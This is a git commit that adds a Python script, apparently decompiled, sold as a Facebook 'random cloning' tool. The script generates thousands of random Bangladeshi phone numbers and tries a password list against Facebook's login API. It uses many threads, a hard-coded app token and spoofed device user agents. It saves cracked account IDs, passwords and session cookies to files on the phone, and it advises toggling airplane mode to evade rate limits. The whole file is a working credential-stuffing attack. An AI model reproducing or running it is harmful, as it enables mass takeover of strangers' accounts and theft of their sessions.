50fc2d5d227192bcbb0f142fbdaccc1da5d4e445
WASIF MUBEEN QURESHI <112629933+wasifmubeenqureshi@users.noreply.github.com>
2026-06-07 15:20:02 +0500

    Add files via upload

---
+++ dec-Akash-file+random.py
@@ -0,0 +1,361 @@
+import os
+import bs4
+import json
+import sys
+import time
+import random
+import re
+import subprocess
+import platform
+import struct
+import string
+import uuid
+import requests
+import httpx
+from bs4 import BeautifulSoup
+from os import path
+import base64
+import zlib
+import pip
+import urllib
+import mechanize
+from os import system as clr
+from bs4 import BeautifulSoup as sop
+from pip._vendor import requests
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import io
+from io import BytesIO
+import pycurl
+import certifi
+
+loop = 0
+oks = []
+cps = []
+id = []
+A = '\x1b[1;97m'
+R = '\x1b[38;5;196m'
+Y = '\x1b[1;33m'
+G = '\x1b[38;5;46m'
+
+ugen = []
+for agent in range(10000):
+    aa = 'Mozilla/5.0 (Linux; Android 6.0.1;'
+    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
+    c = 'en-us; 10; T-Mobile myTouch 3G Slide Build/'
+    d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e = random.randrange(1, 999)
+    f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
+    h = random.randrange(73, 100)
+    i = '0'
+    j = random.randrange(4200, 4900)
+    k = random.randrange(40, 150)
+    l = 'Mobile Safari/533.1'
+    fullagnt = f"{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}"
+    ugen.append(fullagnt)
+
+for xd in range(5000):
+    a = 'Nokia'
+    b = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    c = random.randrange(1, 99)
+    d = '/GoBrowser/'
+    e = '1.6.0.'
+    f = random.randrange(1, 99)
+    uaku2 = f"{a}{b}{c}{d}{e}{f}"
+    ugen.append(uaku2)
+
+def clear():
+    os.system('clear')
+    print(logo)
+
+def linex():
+    os.system("xdg-open https://www.facebook.com/titer665555111")
+    print(f"{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+
+def fuckx():
+    model = random.choice(['V2437', 'V2437', 'V2426', 'V2441', 'V2350', 'V2420'])
+    ufff = f'[FBAN/FB4A;FBAV/{str(random.randint(10, 100))}.0.0.{str(random.randint(4000, 5000))};FBBV/{str(random.randint(4000000, 5000000))};[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{{density=3.0,width=1080,height=2076}};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
+    return ufff
+
+logo = '\n █████  ██   ██  █████  ███████ ██   ██ \n██   ██ ██  ██  ██   ██ ██      ██   ██ \n███████ █████   ███████ ███████ ███████ \n██   ██ ██  ██  ██   ██      ██ ██   ██ \n██   ██ ██   ██ ██   ██ ███████ ██   ██  V/0.3\n\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;93mOWNER \x1b[1;91m     :   \x1b[1;93mAKASH_ON_FIRE\n\x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mTOOL TYPE \x1b[1;91m :   \x1b[1;92mRANDAM\n\x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;94mVERSION \x1b[1;91m   :   \x1b[1;94mPREMIUM\n\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'
+
+def menu():
+    clear()
+    print('\x1b[1;94m[1] RANDOM CLONING')
+    print('\x1b[1;95m[4] EXIT CLONING')
+    linex()
+    option = input('\x1b[1;96m[?] CHOICE : ')
+    if option in ('A', '2'):
+        __Filex__()
+    elif option in ('B', '1'):
+        __Randmx__()
+    elif option in ('C', '3'):
+        __Gmailx__()
+    elif option in ('D', '4'):
+        exit()
+    else:
+        print(f'\n{A}|=| OPTION FOUND')
+        menu()
+
+def __Randmx__():
+    os.system("xdg-open https://www.facebook.com/titer665555111")
+    clear()
+    print('\x1b[1;94m[1] BANGLADESH CLONING')
+    print('\x1b[1;95m[2] INDIA CLONING')
+    linex()
+    option = input('\x1b[1;94m[?] CHOICE : ')
+    if option in ('A', '1'):
+        __bdx__()
+    elif option in ('B', '2'):
+        __india__()
+    elif option in ('C', '3'):
+        __nepalx__()
+    elif option in ('D', '4'):
+        __pakistan__()
+    elif option in ('E', '5'):
+        __afghanistanx__()
+    else:
+        print(f'\n{A}|=| OPTION FOUND')
+        menu()
+
+def __bdx__():
+    user = []
+    clear()
+    print('\x1b[1;94m[≋] EXAMPLE : 017 / 019 / 016 / 018')
+    linex()
+    code = input(f'{R}[?] CHOICE  : ')
+    clear()
+    print('\x1b[1;95m[≋] EXAMPLE : 5000 / 10000 / 9999 / 99999')
+    linex()
+    try:
+        limit = int(input('\x1b[1;94m[?] CHOICE  : '))
+    except ValueError:
+        limit = 50000
+    clear()
+    print('\x1b[1;99m[1] METHOD M1 ')
+    print('\x1b[1;94m[2] METHOD M2 ')
+    linex()
+    methodx = input('\x1b[1;95m[?] CHOICE : ')
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    AKASHx = ThreadPool(max_workers=30)
+    clear()
+    tl = str(len(user))
+    print(f'\x1b[1;94m[≋] RANDOM UID : {tl} ')
+    print(f'\x1b[1;95m[≋] SIM CODE   : {code} ')
+    print('\x1b[1;94m[≋] USE AIRPLANE MODE EVERY 5 MINTS ')
+    linex()
+    for love in user:
+        ids = code + love
+        passlist = [
+            love[None:7], love[None:6], love[5:None], love[4:None],
+            'sadiya', 'jannat', 'ffakash', 'i love you', 'ffking',
+            'freefire,hakim123', 'ff@@@@', '@@@###', '###@@@', '017123',
+            'mim123', 'freefire11', 'akash123@', 'habib12', 'ffhakim', 'ffhahid'
+        ]
+        if methodx in ('1',):
+            AKASHx.submit(__Randm_M1__, ids, passlist)
+        elif methodx in ('2',):
+            AKASHx.submit(__Randm_M2__, ids, passlist)
+        elif methodx in ('3',):
+            AKASHx.submit(__Randm_M3__, ids, passlist)
+        elif methodx in ('4',):
+            AKASHx.submit(__Randm_M4__, ids, passlist)
+        elif methodx in ('5',):
+            AKASHx.submit(__Randm_M5__, ids, passlist)
+    AKASHx.shutdown()
+    print('')
+    print(f"{A}\x1a"*50)
+    print('\x1b[1;94m[≋] CLONING COMPLETE ')
+    print(f'\x1b[1;95m[≋] TOTAL OK ID :{G} {len(oks)}')
+    print(f'\x1b[1;94m[≋] TOTAL CP ID :{R} {len(cps)}')
+    print(f"{A}\x1a"*50)
+    exit()
+
+def __Randm_M1__(ids, passlist):
+    global loop
+    sys.stdout.write(f'\r{R}[{Y}AKASH M1{R}]{A}-{R}[{A}{loop}{R}]{A}-{R}[{G}OK•{R}]')
+    sys.stdout.flush()
+    for pas in passlist:
+        try:
+            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+            random_seed = random.Random()
+            data = {
+                'adid': str(uuid.uuid4()),
+                'format': 'json',
+                'device_id': str(uuid.uuid4()),
+                'email': ids,
+                'password': pas,
+                'generate_analytics_claims': '1',
+                'community_id': '',
+                'cpl': 'true',
+                'try_num': '1',
+                'family_device_id': str(uuid.uuid4()),
+                'credentials_type': 'password',
+                'source': 'login',
+                'error_detail_type': 'button_with_disabled',
+                'enroll_misauth': 'false',
+                'generate_session_cookies': '1',
+                'generate_machine_id': '1',
+                'currently_logged_in_userid': '0',
+                'locale': 'en_GB',
+                'client_country_code': 'GB',
+                'fb_api_req_friendly_name': 'authenticate',
+                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
+                'access_token': accees_token
+            }
+            headers = {
+                'User-Agent': fuckx(),
+                'Accept-Encoding': 'gzip, deflate',
+                'Connection': 'Keep-Alive',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Host': 'graph.facebook.com',
+                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'X-FB-Connection-Type': 'MOBILE.LTE',
+                'X-Tigon-Is-Retry': 'False',
+                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
+                'x-fb-device-group': '5120',
+                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                'X-FB-Request-Analytics-Tags': 'graphservice',
+                'X-FB-HTTP-Engine': 'Liger',
+                'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True',
+                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'
+            }
+            url = 'https://graph.facebook.com/auth/login'
+            po = requests.post(url, data=data, headers=headers).json()
+            if 'session_key' in po:
+                uid = po['uid']
+                coki = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
+                print(f'\r\r{G}|AKASH-OK| {str(uid)} | {pas} ')
+                print(f'\r\r{G}|COKI|-> {coki} ')
+                with open('/sdcard/AKASH-RNDM-OK.txt', 'a') as f:
+                    f.write(f'{uid}|{pas}|{coki}\n')
+                oks.append(str(uid))
+                break
+            elif 'www.facebook.com' in po['error']['message']:
+                uid = po['error']['error_data']['uid']
+                print(f'\r\r{R}|AKASH-CP| {str(uid)} | {pas} ')
+                with open('/sdcard/AKASH-RNDM-CP.txt', 'a') as f:
+                    f.write(f'{uid}|{pas}\n')
+                cps.append(str(uid))
+        except:
+            continue
+    loop += 1
+
+def __Randm_M2__(ids, passlist):
+    global loop
+    sys.stdout.write(f'\r\r{A}|AKASH-M2| {loop} {G}|{A}{len(oks)}{G}|{A}{len(cps)} ')
+    sys.stdout.flush()
+    for pas in passlist:
+        try:
+            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+            random_seed = random.Random()
+            data = {
+                'adid': str(uuid.uuid4()),
+                'format': 'json',
+                'device_id': str(uuid.uuid4()),
+                'email': ids,
+                'password': pas,
+                'generate_analytics_claims': '1',
+                'community_id': '',
+                'cpl': 'true',
+                'try_num': '1',
+                'family_device_id': str(uuid.uuid4()),
+                'credentials_type': 'password',
+                'source': 'login',
+                'error_detail_type': 'button_with_disabled',
+                'enroll_misauth': 'false',
+                'generate_session_cookies': '1',
+                'generate_machine_id': '1',
+                'currently_logged_in_userid': '0',
+                'locale': 'en_GB',
+                'client_country_code': 'GB',
+                'fb_api_req_friendly_name': 'authenticate',
+                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
+                'access_token': accees_token
+            }
+            headers = {
+                'User-Agent': fuckx(),
+                'Accept-Encoding': 'gzip, deflate',
+                'Connection': 'Keep-Alive',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Host': 'graph.facebook.com',
+                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'X-FB-Connection-Type': 'MOBILE.LTE',
+                'X-Tigon-Is-Retry': 'False',
+                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
+                'x-fb-device-group': '5120',
+                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                'X-FB-Request-Analytics-Tags': 'graphservice',
+                'X-FB-HTTP-Engine': 'Liger',
+                'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True',
+                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'
+            }
+            url = 'https://api.facebook.com/auth/login'
+            po = requests.post(url, data=data, headers=headers).json()
+            if 'session_key' in po:
+                uid = po['uid']
+                coki = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
+                print(f'\r\r{G}|AKASH-OK| {str(uid)} | {pas} ')
+                print(f'\r\r{G}|COKI|-> {coki} ')
+                with open('/sdcard/AKASH-RNDM-OK.txt', 'a') as f:
+                    f.write(f'{uid}|{pas}|{coki}\n')
+                oks.append(str(uid))
+                break
+            elif 'www.facebook.com' in po['error']['message']:
+                uid = po['error']['error_data']['uid']
+                print(f'\r\r{R}|AKASH-CP| {str(uid)} | {pas} ')
+                with open('/sdcard/AKASH-RNDM-CP.txt', 'a') as f:
+                    f.write(f'{uid}|{pas}\n')
+                cps.append(str(uid))
+        except:
+            continue
+    loop += 1
+
+def apv():
+    try:
+        url = 'https://github.com/AXR-99/Aproval/blob/main/Ap.txt'
+        buffer = BytesIO()
+        curl = pycurl.Curl()
+        curl.setopt(curl.URL, url)
+        curl.setopt(curl.WRITEDATA, buffer)
+        curl.setopt(curl.CAINFO, certifi.where())
+        curl.perform()
+        curl.close()
+        datax = buffer.getvalue().decode('utf-8')
+        if num_key in datax:
+            menu()
+        else:
+            clear()
+            print(' [✓] Key Not Approved')
+            print(f' !! Key - {num_key}')
+            os.system('termux-open https://facebook.com/groups/430144089559219/')
+            sys.exit()
+    except Exception as e:
+        print(e)
+        sys.exit('[!!] Internet Error...')
+
+# Additional function placeholders (not fully implemented in disassembly)
+def __Filex__(): pass
+def __Gmailx__(): pass
+def __india__(): pass
+def __nepalx__(): pass
+def __pakistan__(): pass
+def __afghanistanx__(): pass
+def __Randm_M3__(ids, passlist): pass
+def __Randm_M4__(ids, passlist): pass
+def __Randm_M5__(ids, passlist): pass
+
+# Key generation
+K1 = str(os.getuid())
+K2 = str(os.getgid())
+num_key = "MRSMILE".join(K1 + K2).upper()
+
+apv()
